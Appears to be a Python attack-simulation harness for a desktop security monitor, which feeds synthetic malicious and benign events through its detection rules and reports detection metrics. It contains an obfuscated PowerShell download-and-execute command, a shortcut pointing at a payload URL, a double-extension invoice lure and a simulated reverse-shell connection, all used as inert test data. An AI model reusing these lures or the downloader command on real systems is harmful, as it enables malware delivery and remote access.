from __future__ import annotations

from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Any
import os
import statistics
import time
import zipfile

from .analysis import RuleEngine
from .config import AppConfig
from .events import ActionDecision, RuleAssessment, SecurityEvent
from .incidents import IncidentCorrelator, IncidentStore
from .llm import LLMRouter
from .notifications import NotificationManager
from .policy import PolicyEngine
from .sensors import FileScanner
from .verification import _minimal_pe, _try_write_zone_identifier


ATTACK_RUBRIC = [
    "Download droppers hidden in archives are escalated before extraction",
    "Internet shortcut and shortcut-style droppers are not treated as harmless text",
    "Obfuscated PowerShell downloader command lines route to high-risk handling",
    "LOLBins with public internet connections are escalated for investigation",
    "New USB HID devices cross a notification-worthy threshold",
    "Correlated RAT-style process and reverse-shell activity becomes an emergency-eligible incident",
    "Persistence from a temporary download path is escalated with evidence-preserving controls",
    "Public cleartext exfiltration from a temporary executable is routed to investigation",
    "Routine administrator PowerShell and local developer listeners stay below escalation thresholds",
]

RESIDUAL_WEAKNESSES = [
    {
        "id": "passive_network_only",
        "severity": "low",
        "detail": (
            "Network protection is metadata-based. Connections are now enriched with DNS Cache, "
            "but there is still no deep packet inspection (DPI) or firewall enforcement."
        ),
    },
]


def run_live_threat_simulation(
    config: AppConfig,
    rules: RuleEngine,
    policy: PolicyEngine,
) -> dict[str, Any]:
    """Inject inert RAT-like telemetry through the production incident pipeline.

    No process, payload, persistence entry, network connection or emergency lock is
    created. The durable incident and desktop notification are real and explicitly
    labelled as simulation evidence so operators can validate the actual UX safely.
    """
    store = IncidentStore(
        config.runtime.incident_log_path,
        config.runtime.integrity_key_path,
        max_bytes=config.runtime.max_incident_log_bytes,
        max_archives=config.runtime.max_incident_archives,
        max_live_incidents=config.runtime.max_live_incidents,
    )
    correlator = IncidentCorrelator(store)
    synthetic_pid = 900_000 + int(time.time()) % 90_000
    assessments: list[RuleAssessment] = []
    incident = None
    decision = None
    for event in (
        _obfuscated_powershell_event_for_pid(synthetic_pid),
        _reverse_shell_event_for_pid(synthetic_pid),
    ):
        assessment = rules.assess(event)
        decision = policy.local_decision(assessment)
        incident = correlator.observe(assessment, decision)
        assessments.append(assessment)
    if incident is None or decision is None:
        return {"ok": False, "error": "simulation-did-not-create-incident"}
    notification = NotificationManager(config.notifications).notify(
        assessments[-1], decision, incident=incident
    )
    return {
        "ok": True,
        "simulation": True,
        "inert": True,
        "incident_id": incident.incident_id,
        "risk_score": incident.risk_score,
        "risk_level": incident.risk_level,
        "decision_required": incident.decision_required,
        "emergency_eligible": incident.emergency_eligible,
        "recommended_actions": list(incident.recommended_actions),
        "notification": {
            "sent": notification.sent,
            "reason": notification.reason,
            "title": notification.title,
        },
        "safety": {
            "payload_executed": False,
            "network_connection_created": False,
            "persistence_created": False,
            "desktop_locked": False,
            "automatic_response_applied": False,
        },
    }


def run_attack_simulation(
    config: AppConfig,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool = False,
    keep_artifacts: Path | None = None,
) -> dict[str, Any]:
    if keep_artifacts is not None:
        keep_artifacts.mkdir(parents=True, exist_ok=True)
        return _run_attack_cases(keep_artifacts, True, config, rules, router, policy, use_llm)

    with TemporaryDirectory(prefix="monarch-attack-lab-") as directory:
        return _run_attack_cases(Path(directory), False, config, rules, router, policy, use_llm)


def _run_attack_cases(
    lab_root: Path,
    artifacts_retained: bool,
    config: AppConfig,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool,
) -> dict[str, Any]:
    protector_idle = _sample_protector_idle(config)
    burst_sampler = _ProcessBurstSampler()
    burst_sampler.start()
    artifacts = _write_attack_artifacts(lab_root)
    cases = [
        _file_case(
            "zip_dropper_double_extension",
            artifacts["dropper_zip"],
            config,
            rules,
            router,
            policy,
            use_llm,
            min_score=65,
            expected_routes={"llm"},
            required_reason="Archive contains double-extension",
            required_control="archive",
        ),
        _file_case(
            "internet_shortcut_dropper",
            artifacts["internet_shortcut"],
            config,
            rules,
            router,
            policy,
            use_llm,
            min_score=35,
            expected_routes={"deep_scan", "llm"},
            required_reason="Executable or script extension",
        ),
        _event_case(
            "obfuscated_powershell_iwr_iex",
            _obfuscated_powershell_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=65,
            expected_routes={"llm"},
            required_reason="suspicious markers",
            required_control="process tree",
        ),
        _event_case(
            "rundll32_public_tls_connection",
            _rundll32_public_connection_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=50,
            expected_routes={"deep_scan", "llm"},
            required_control="public remote endpoint",
        ),
        _event_case(
            "new_usb_hid_keyboard",
            _usb_hid_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=35,
            expected_routes={"deep_scan", "llm"},
            required_reason="human-interface device",
        ),
        _incident_chain_case(
            "rat_powershell_reverse_shell_chain",
            [_obfuscated_powershell_event_for_pid(6003), _reverse_shell_event_for_pid(6003)],
            rules,
            policy,
            min_risk=550,
            required_families={"process", "network"},
            required_action="block_network",
        ),
        _event_case(
            "download_persistence_run_key",
            _download_persistence_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=65,
            expected_routes={"llm"},
            required_reason="temp/download location",
            required_control="Export the startup entry",
        ),
        _event_case(
            "temp_tool_public_ftp_exfiltration",
            _public_ftp_exfiltration_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=60,
            expected_routes={"deep_scan"},
            required_reason="cleartext port",
            required_control="public remote endpoint",
        ),
    ]
    benign_cases = [
        _benign_event_case("normal_explorer_process", _normal_process_event(), rules, max_score=20),
        _benign_event_case("private_browser_tls", _private_browser_event(), rules, max_score=20),
        _benign_event_case("ordinary_usb_storage", _ordinary_usb_storage_event(), rules, max_score=20),
        _benign_event_case("admin_powershell_get_service", _admin_powershell_event(), rules, max_score=25),
        _benign_event_case("local_node_dev_listener", _local_dev_listener_event(), rules, max_score=15),
        _benign_event_case("trusted_network_profile_refresh", _trusted_network_refresh_event(), rules, max_score=25),
        _benign_event_case("approved_persistence_exact_match", _approved_persistence_event(), rules, max_score=5),
    ]

    survived = [case for case in cases if not case["passed"]]
    false_positives = [case for case in benign_cases if not case["passed"]]
    durations = [float(case["duration_ms"]) for case in [*cases, *benign_cases]]
    burst_resources = burst_sampler.finish()
    incident_pipeline = _measure_incident_pipeline(rules, policy)
    return {
        "passed": not survived and not false_positives,
        "case_count": len(cases),
        "benign_case_count": len(benign_cases),
        "survived_evasions": [case["name"] for case in survived],
        "false_positives": [case["name"] for case in false_positives],
        "metrics": {
            "detection_rate": round((len(cases) - len(survived)) / max(1, len(cases)), 4),
            "false_positive_rate": round(len(false_positives) / max(1, len(benign_cases)), 4),
            "case_latency_ms_p50": round(statistics.median(durations), 4),
            "case_latency_ms_p95": round(_percentile(durations, 0.95), 4),
            "case_latency_ms_max": round(max(durations, default=0.0), 4),
            "measurement": "local_inert_replay",
            "protector_idle": protector_idle,
            "replay_process_burst": burst_resources,
            "sensor_to_incident": incident_pipeline,
            "coverage": {
                "attack_families": sorted({str(case["scenario_family"]) for case in cases}),
                "benign_workloads": sorted({str(case["scenario_family"]) for case in benign_cases}),
            },
        },
        "rubric": ATTACK_RUBRIC,
        "use_llm": use_llm,
        "artifacts_retained": artifacts_retained,
        "artifact_root": str(lab_root) if artifacts_retained else None,
        "note": "Attack simulation uses inert files and synthetic events; no payloads are executed.",
        "cases": cases,
        "benign_cases": benign_cases,
        "residual_weaknesses": RESIDUAL_WEAKNESSES,
    }


def _write_attack_artifacts(root: Path) -> dict[str, Path]:
    sample_root = root / "Downloads"
    sample_root.mkdir(parents=True, exist_ok=True)

    dropper_zip = sample_root / "invoice_bundle.zip"
    with zipfile.ZipFile(dropper_zip, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("invoice.pdf.exe", _minimal_pe())
        archive.writestr("word/vbaProject.bin", b"placeholder macro stream")
        archive.writestr("readme.txt", "Open invoice.pdf first.\n")
    _try_write_zone_identifier(dropper_zip)

    internet_shortcut = sample_root / "invoice.url"
    internet_shortcut.write_text(
        "[InternetShortcut]\nURL=http://198.51.100.77/payload\nIconFile=calc.exe\n",
        encoding="utf-8",
    )
    _try_write_zone_identifier(internet_shortcut)

    return {
        "dropper_zip": dropper_zip,
        "internet_shortcut": internet_shortcut,
    }


def _file_case(
    name: str,
    path: Path,
    config: AppConfig,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool,
    min_score: int,
    expected_routes: set[str],
    required_reason: str | None = None,
    required_control: str | None = None,
) -> dict[str, Any]:
    started = time.perf_counter_ns()
    event = FileScanner(config.files).inspect(path)
    result = _evaluate_case(
        name,
        rules.assess(event),
        _decide(event, rules, router, policy, use_llm),
        min_score,
        expected_routes,
        required_reason,
        required_control,
    )
    result["duration_ms"] = (time.perf_counter_ns() - started) / 1_000_000
    return result


def _event_case(
    name: str,
    event: SecurityEvent,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool,
    min_score: int,
    expected_routes: set[str],
    required_reason: str | None = None,
    required_control: str | None = None,
) -> dict[str, Any]:
    started = time.perf_counter_ns()
    result = _evaluate_case(
        name,
        rules.assess(event),
        _decide(event, rules, router, policy, use_llm),
        min_score,
        expected_routes,
        required_reason,
        required_control,
    )
    result["duration_ms"] = (time.perf_counter_ns() - started) / 1_000_000
    return result


def _benign_event_case(name: str, event: SecurityEvent, rules: RuleEngine, *, max_score: int) -> dict[str, Any]:
    started = time.perf_counter_ns()
    assessment = rules.assess(event)
    failures = [] if assessment.score <= max_score else [f"score {assessment.score} exceeds benign maximum {max_score}"]
    return {
        "name": name,
        "passed": not failures,
        "failures": failures,
        "score": assessment.score,
        "severity": assessment.severity,
        "route": assessment.route,
        "subject": event.subject,
        "ground_truth": "benign",
        "scenario_family": _scenario_family(name),
        "duration_ms": (time.perf_counter_ns() - started) / 1_000_000,
    }


def _decide(
    event: SecurityEvent,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool,
) -> ActionDecision:
    assessment = rules.assess(event)
    return router.decide(assessment) if use_llm else policy.local_decision(assessment)


def _evaluate_case(
    name: str,
    assessment: RuleAssessment,
    decision: ActionDecision,
    min_score: int,
    expected_routes: set[str],
    required_reason: str | None,
    required_control: str | None,
) -> dict[str, Any]:
    failures: list[str] = []
    if assessment.score < min_score:
        failures.append(f"score {assessment.score} is below expected minimum {min_score}")
    if assessment.route not in expected_routes:
        failures.append(f"route {assessment.route!r} is not one of {sorted(expected_routes)}")
    if required_reason and not _contains(assessment.reasons, required_reason):
        failures.append(f"missing expected reason containing {required_reason!r}")
    if required_control and not _contains(decision.controls, required_control):
        failures.append(f"missing expected control containing {required_control!r}")

    return {
        "name": name,
        "passed": not failures,
        "failures": failures,
        "score": assessment.score,
        "severity": assessment.severity,
        "route": assessment.route,
        "action": decision.action,
        "source": decision.source,
        "subject": assessment.event.subject,
        "reasons": assessment.reasons,
        "controls": decision.controls,
        "ground_truth": "malicious",
        "scenario_family": _scenario_family(name),
    }


def _incident_chain_case(
    name: str,
    events: list[SecurityEvent],
    rules: RuleEngine,
    policy: PolicyEngine,
    *,
    min_risk: int,
    required_families: set[str],
    required_action: str,
) -> dict[str, Any]:
    started = time.perf_counter_ns()
    with TemporaryDirectory(prefix="monarch-chain-replay-") as directory:
        root = Path(directory)
        store = IncidentStore(root / "incidents.jsonl", root / "integrity.key")
        correlator = IncidentCorrelator(store)
        incident = None
        assessments: list[RuleAssessment] = []
        for event in events:
            assessment = rules.assess(event)
            assessments.append(assessment)
            incident = correlator.observe(assessment, policy.local_decision(assessment))

    failures: list[str] = []
    risk = incident.risk_score if incident else 0
    families = set(incident.evidence_families) if incident else set()
    actions = incident.recommended_actions if incident else ()
    emergency_eligible = bool(incident and incident.emergency_eligible)
    if incident is None:
        failures.append("correlated chain did not create a durable incident")
    else:
        if risk < min_risk:
            failures.append(f"incident risk {risk} is below expected minimum {min_risk}")
        missing_families = required_families - families
        if missing_families:
            failures.append(f"incident is missing evidence families {sorted(missing_families)}")
        if required_action not in actions:
            failures.append(f"incident is missing recommended action {required_action!r}")
        if not emergency_eligible:
            failures.append("incident is not emergency eligible")

    return {
        "name": name,
        "passed": not failures,
        "failures": failures,
        "score": max((item.score for item in assessments), default=0),
        "incident_risk": risk,
        "severity": incident.risk_level if incident else "clean",
        "route": "incident_correlation",
        "action": "ask_user",
        "source": "rules",
        "subject": events[-1].subject if events else name,
        "reasons": [reason for item in assessments for reason in item.reasons],
        "controls": list(actions),
        "evidence_families": sorted(families),
        "emergency_eligible": emergency_eligible,
        "ground_truth": "malicious",
        "scenario_family": _scenario_family(name),
        "duration_ms": (time.perf_counter_ns() - started) / 1_000_000,
    }


def _scenario_family(name: str) -> str:
    if name.startswith("rat_"):
        return "rat"
    if "persistence" in name:
        return "persistence"
    if "exfiltration" in name:
        return "exfiltration"
    if name.startswith("admin_"):
        return "administrator"
    if "dev_" in name:
        return "developer"
    if "network_profile" in name:
        return "network_admin"
    if "usb" in name:
        return "device"
    if "connection" in name or "tls" in name:
        return "network"
    if "powershell" in name or "process" in name:
        return "process"
    return "file"


def _contains(values: list[str], needle: str) -> bool:
    lowered = needle.lower()
    return any(lowered in value.lower() for value in values)


def _obfuscated_powershell_event() -> SecurityEvent:
    return SecurityEvent(
        kind="process.started",
        source="attack_simulation",
        subject="powershell.exe",
        facts={
            "pid": 6001,
            "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": [
                "powershell.exe",
                "-NoP",
                "-W",
                "Hidden",
                "i`w`r",
                "http://198.51.100.77/a",
                "|",
                "i`e`x",
            ],
            "parent_name": "explorer.exe",
        },
    )


def _rundll32_public_connection_event() -> SecurityEvent:
    return SecurityEvent(
        kind="network.connection_seen",
        source="attack_simulation",
        subject="198.51.100.77:443",
        facts={
            "local_address": "192.168.1.10",
            "local_port": 51515,
            "remote_address": "198.51.100.77",
            "remote_port": 443,
            "remote_scope": "public",
            "remote_is_public": True,
            "owning_process": 6002,
            "process_name": "rundll32.exe",
        },
    )


def _usb_hid_event() -> SecurityEvent:
    return SecurityEvent(
        kind="device.connected",
        source="attack_simulation",
        subject="USB Composite Keyboard",
        facts={
            "class": "Keyboard",
            "friendly_name": "USB Composite Keyboard",
            "instance_id": r"USB\VID_1337&PID_0001\ATTACKLAB",
            "status": "OK",
        },
    )


def _normal_process_event() -> SecurityEvent:
    return SecurityEvent(
        kind="process.started",
        source="attack_simulation_benign",
        subject="explorer.exe",
        facts={
            "pid": 7001,
            "name": "explorer.exe",
            "exe": r"C:\Windows\explorer.exe",
            "cmdline": ["explorer.exe"],
            "parent_name": "userinit.exe",
        },
    )


def _private_browser_event() -> SecurityEvent:
    return SecurityEvent(
        kind="network.connection_seen",
        source="attack_simulation_benign",
        subject="192.168.1.2:443",
        facts={
            "remote_address": "192.168.1.2",
            "remote_port": 443,
            "remote_scope": "private",
            "remote_is_public": False,
            "owning_process": 7002,
            "process_name": "chrome.exe",
        },
    )


def _ordinary_usb_storage_event() -> SecurityEvent:
    return SecurityEvent(
        kind="device.connected",
        source="attack_simulation_benign",
        subject="USB Mass Storage Device",
        facts={
            "class": "DiskDrive",
            "friendly_name": "USB Mass Storage Device",
            "instance_id": r"USBSTOR\DISK&VEN_TEST\BENIGN",
            "status": "OK",
            "trusted_device": True,
        },
    )


def _download_persistence_event() -> SecurityEvent:
    return SecurityEvent(
        kind="persistence.entry_added",
        source="attack_simulation",
        subject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
        facts={
            "kind": "run_key",
            "path": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "value": r"C:\Users\demo\Downloads\updater.exe -silent",
            "extension": ".exe",
            "approved_baseline_entry_changed": True,
        },
    )


def _public_ftp_exfiltration_event() -> SecurityEvent:
    return SecurityEvent(
        kind="network.connection_seen",
        source="attack_simulation",
        subject="198.51.100.88:21",
        facts={
            "local_address": "192.168.1.10",
            "local_port": 51521,
            "remote_address": "198.51.100.88",
            "remote_port": 21,
            "remote_scope": "public",
            "remote_is_public": True,
            "owning_process": 6004,
            "process_name": "sync-tool.exe",
            "process_exe": r"C:\Users\demo\AppData\Local\Temp\sync-tool.exe",
        },
    )


def _admin_powershell_event() -> SecurityEvent:
    return SecurityEvent(
        kind="process.started",
        source="attack_simulation_benign",
        subject="powershell.exe",
        facts={
            "pid": 7003,
            "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": ["powershell.exe", "Get-Service", "WinDefend"],
            "parent_name": "WindowsTerminal.exe",
        },
    )


def _local_dev_listener_event() -> SecurityEvent:
    return SecurityEvent(
        kind="network.listener_seen",
        source="attack_simulation_benign",
        subject="127.0.0.1:5173",
        facts={
            "local_address": "127.0.0.1",
            "local_port": 5173,
            "local_scope": "loopback",
            "owning_process": 7004,
            "process_name": "node.exe",
        },
    )


def _trusted_network_refresh_event() -> SecurityEvent:
    return SecurityEvent(
        kind="network.config_changed",
        source="attack_simulation_benign",
        subject="Trusted home network",
        facts={
            "network_profile_trusted": True,
            "dns": ["192.168.1.1"],
            "gateway": ["192.168.1.1"],
            "dns_public_count": 0,
        },
    )


def _approved_persistence_event() -> SecurityEvent:
    return SecurityEvent(
        kind="persistence.entry_added",
        source="attack_simulation_benign",
        subject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VendorUpdater",
        facts={
            "kind": "run_key",
            "value": r"C:\Program Files\Vendor\updater.exe --background",
            "extension": ".exe",
            "approved_baseline_exact_match": True,
            "approved_baseline_entry_changed": False,
        },
    )


def _percentile(values: list[float], quantile: float) -> float:
    if not values:
        return 0.0
    ordered = sorted(values)
    index = min(len(ordered) - 1, max(0, int(round((len(ordered) - 1) * quantile))))
    return ordered[index]


class _ProcessBurstSampler:
    def __init__(self) -> None:
        self.process = None
        self.psutil = None
        self.rss_before = None
        self.cpu_seconds_before = None
        self.wall_started = None
        try:
            import psutil  # type: ignore

            self.psutil = psutil
            self.process = psutil.Process(os.getpid())
        except Exception:
            self.process = None

    def start(self) -> None:
        if self.process is None:
            return
        cpu = self.process.cpu_times()
        self.cpu_seconds_before = float(cpu.user + cpu.system)
        self.wall_started = time.perf_counter()
        if self.psutil is not None:
            self.psutil.cpu_percent(interval=None)
        self.rss_before = int(self.process.memory_info().rss)

    def finish(self) -> dict[str, Any]:
        if self.process is None:
            return {"available": False, "reason": "psutil unavailable"}
        info = self.process.memory_info()
        rss_after = int(info.rss)
        peak = int(getattr(info, "peak_wset", max(self.rss_before or 0, rss_after)))
        cpu = self.process.cpu_times()
        cpu_seconds_after = float(cpu.user + cpu.system)
        wall_seconds = max(0.000001, time.perf_counter() - float(self.wall_started or time.perf_counter()))
        cpu_percent = max(0.0, (cpu_seconds_after - float(self.cpu_seconds_before or 0.0)) / wall_seconds * 100.0)
        return {
            "available": True,
            "scope": "attack_simulation_process",
            "cpu_percent": round(cpu_percent, 2),
            "system_cpu_percent": round(float(self.psutil.cpu_percent(interval=None)), 2) if self.psutil is not None else None,
            "wall_seconds": round(wall_seconds, 4),
            "rss_before_bytes": self.rss_before,
            "rss_after_bytes": rss_after,
            "rss_peak_observed_bytes": max(self.rss_before or 0, rss_after, peak),
        }


def _sample_protector_idle(config: AppConfig) -> dict[str, Any]:
    try:
        raw_pid = config.runtime.pid_path.read_text(encoding="utf-8").strip()
        pid = int(raw_pid)
        import psutil  # type: ignore

        process = psutil.Process(pid)
        cpu_samples = [float(process.cpu_percent(interval=0.1)) for _ in range(10)]
        info = process.memory_info()
        return {
            "available": True,
            "scope": "background_protector_observation_window",
            "pid": pid,
            "sample_seconds": 1.0,
            "sample_count": len(cpu_samples),
            "cpu_percent": round(statistics.median(cpu_samples), 2),
            "cpu_percent_p95": round(_percentile(cpu_samples, 0.95), 2),
            "rss_bytes": int(info.rss),
            "not_guaranteed_idle": True,
        }
    except Exception as exc:
        return {
            "available": False,
            "scope": "background_protector_process",
            "reason": f"{type(exc).__name__}: {exc}"[:160],
        }


def _measure_incident_pipeline(rules: RuleEngine, policy: PolicyEngine, iterations: int = 5) -> dict[str, Any]:
    latencies: list[float] = []
    final_scores: list[int] = []
    with TemporaryDirectory(prefix="monarch-incident-replay-") as directory:
        root = Path(directory)
        store = IncidentStore(root / "incidents.jsonl", root / "integrity.key")
        correlator = IncidentCorrelator(store)
        for index in range(max(1, min(20, int(iterations)))):
            pid = 8100 + index
            process_event = _obfuscated_powershell_event_for_pid(pid)
            network_event = _reverse_shell_event_for_pid(pid)
            started = time.perf_counter_ns()
            for event in (process_event, network_event):
                assessment = rules.assess(event)
                incident = correlator.observe(assessment, policy.local_decision(assessment))
            latencies.append((time.perf_counter_ns() - started) / 1_000_000)
            final_scores.append(int(incident.risk_score if incident is not None else 0))
    return {
        "available": True,
        "scope": "synthetic_sensor_event_to_durable_incident",
        "iterations": len(latencies),
        "latency_ms_p50": round(statistics.median(latencies), 4),
        "latency_ms_p95": round(_percentile(latencies, 0.95), 4),
        "latency_ms_max": round(max(latencies, default=0.0), 4),
        "minimum_final_risk": min(final_scores, default=0),
        "includes_rule_policy_correlation_hmac_fsync": True,
        "excludes_sensor_poll_wait": True,
    }


def _obfuscated_powershell_event_for_pid(pid: int) -> SecurityEvent:
    event = _obfuscated_powershell_event()
    return SecurityEvent(
        kind=event.kind,
        source=event.source,
        subject=event.subject,
        facts={**event.facts, "pid": pid},
    )


def _reverse_shell_event_for_pid(pid: int) -> SecurityEvent:
    return SecurityEvent(
        kind="network.connection_seen",
        source="attack_simulation",
        subject="198.51.100.77:4444",
        facts={
            "remote_address": "198.51.100.77",
            "remote_port": 4444,
            "remote_scope": "public",
            "remote_is_public": True,
            "owning_process": pid,
            "process_name": "powershell.exe",
        },
    )
